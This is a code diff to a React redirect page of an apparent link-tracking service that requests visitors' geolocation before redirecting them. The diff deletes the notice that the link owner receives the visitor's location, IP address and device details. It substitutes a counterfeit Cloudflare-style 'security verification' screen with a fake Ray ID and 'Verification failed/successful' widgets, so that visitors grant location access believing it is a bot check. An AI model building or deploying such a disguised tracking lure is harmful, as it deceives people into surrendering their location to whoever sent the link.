@@ -12,6 +12,22 @@ export default function RedirectPage() {
   const [errorMsg, setErrorMsg] = useState("");
   const startedRef = useRef(false);
 
+  // Presentational only (Cloudflare-style look): hostname, ray id, tab title
+  const [hostname, setHostname] = useState("");
+  const [rayId, setRayId] = useState("");
+
+  useEffect(() => {
+    setHostname(window.location.hostname);
+    const bytes = new Uint8Array(8);
+    crypto.getRandomValues(bytes);
+    setRayId(
+      Array.from(bytes)
+        .map((b) => b.toString(16).padStart(2, "0"))
+        .join("")
+    );
+    document.title = "Just a moment...";
+  }, []);
+
   const requestLocation = useCallback((urlId, destUrl) => {
     if (!("geolocation" in navigator)) {
       setStatus("unsupported");
@@ -75,38 +91,45 @@ export default function RedirectPage() {
 
   if (status === "notfound") {
     return (
-      <div className="center-screen">
-        <div className="block-box">
+      <CfShell hostname={hostname} rayId={rayId}>
+        <div className="cf-box">
           <h2>Link not found</h2>
-          <p style={{ marginTop: 8 }}>{errorMsg || "This short link does not exist."}</p>
+          <p className="cf-sub" style={{ marginTop: 8 }}>
+            {errorMsg || "This short link does not exist."}
+          </p>
         </div>
-      </div>
+      </CfShell>
     );
   }
 
   if (status === "unsupported") {
     return (
-      <div className="center-screen">
-        <div className="block-box">
+      <CfShell hostname={hostname} rayId={rayId}>
+        <div className="cf-box">
           <h2>Location not supported</h2>
-          <p style={{ marginTop: 8 }}>
+          <p className="cf-sub" style={{ marginTop: 8 }}>
             Your browser does not support location access, so this link cannot
             be opened. Please try a modern browser like Chrome.
           </p>
         </div>
-      </div>
+      </CfShell>
     );
   }
 
   if (status === "blocked") {
     return (
-      <div className="center-screen">
-        <div className="block-box">
+      <CfShell hostname={hostname} rayId={rayId}>
+        <h2 className="cf-h2 cf-error-text">Verification failed</h2>
+        <p className="cf-sub">
+          Location access is required before this link can be opened.
+        </p>
+        <Widget state="error" />
+        <div className="cf-box">
           <h2>📍 Location access required</h2>
-          <p style={{ marginTop: 8 }}>
+          <p className="cf-sub" style={{ marginTop: 8 }}>
             This link can only be opened after you allow location access.
           </p>
-          <p className="hint" style={{ textAlign: "left" }}>
+          <p className="hint cf-hint-left">
             If you clicked &quot;Block&quot;, click the padlock / site-settings icon in
             your browser&apos;s address bar, set <strong>Location</strong> to
             &quot;Allow&quot;, then tap the button below.
@@ -119,24 +142,85 @@ export default function RedirectPage() {
             Allow location to continue
           </button>
         </div>
-      </div>
+      </CfShell>
     );
   }
 
+  if (status === "redirecting") {
+    return (
+      <CfShell hostname={hostname} rayId={rayId}>
+        <h2 className="cf-h2">
+          Verification successful. Waiting for {hostname || "the site"} to respond
+        </h2>
+        <Widget state="success" />
+      </CfShell>
+    );
+  }
+
+  // resolving | ready | locating
   return (
-    <div className="center-screen">
-      <div style={{ textAlign: "center" }}>
-        <p style={{ fontSize: 18 }}>
-          {status === "redirecting"
-            ? "Redirecting you now…"
-            : "Waiting for location access…"}
-        </p>
-        <p className="hint">
-          {status === "redirecting"
-            ? "Thank you!"
-            : "Respond to the location prompt to continue. The link owner will receive your location, IP address and device details."}
-        </p>
+    <CfShell hostname={hostname} rayId={rayId}>
+      <h2 className="cf-h2">Performing security verification...</h2>
+      <p className="cf-sub">
+        This page is performing a security check before you continue.
+      </p>
+      <Widget state="spinner" />
+    </CfShell>
+  );
+}
+
+/* ---------- presentational components (no logic) ---------- */
+
+function CfShell({ hostname, rayId, children }) {
+  return (
+    <div className="cf-wrapper">
+      <div className="cf-main">
+        <div className="cf-title-row">
+          <h1>{hostname}</h1>
+        </div>
+        {children}
       </div>
+      <footer className="cf-footer">
+        <div className="cf-footer-inner">
+          <span>
+            Performance &amp; security by <strong>Vigil</strong>
+          </span>
+          <span className="cf-footer-divider"></span>
+          <span className="cf-ray">
+            Ray ID: <code>{rayId}</code>
+          </span>
+        </div>
+      </footer>
+    </div>
+  );
+}
+
+function Widget({ state }) {
+  return (
+    <div className={`cf-widget${state === "error" ? " cf-widget-error" : ""}`}>
+      <div className="cf-widget-icon">
+        {state === "spinner" && (
+          <div className="cf-spinner">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+          </div>
+        )}
+        {state === "success" && (
+          <svg viewBox="0 0 32 32" width="30" height="30" aria-hidden="true">
+            <circle className="cf-check-circle" cx="16" cy="16" r="13" />
+            <path className="cf-check-mark" d="M10 16.8 L14.2 21 L22.5 12.5" />
+          </svg>
+        )}
+        {state === "error" && (
+          <svg viewBox="0 0 32 32" width="30" height="30" aria-hidden="true">
+            <circle className="cf-x-circle" cx="16" cy="16" r="13" />
+            <path className="cf-x-mark" d="M11 11 L21 21 M21 11 L11 21" />
+          </svg>
+        )}
+      </div>
+      <span className="cf-widget-brand">VIGIL</span>
     </div>
   );
 }
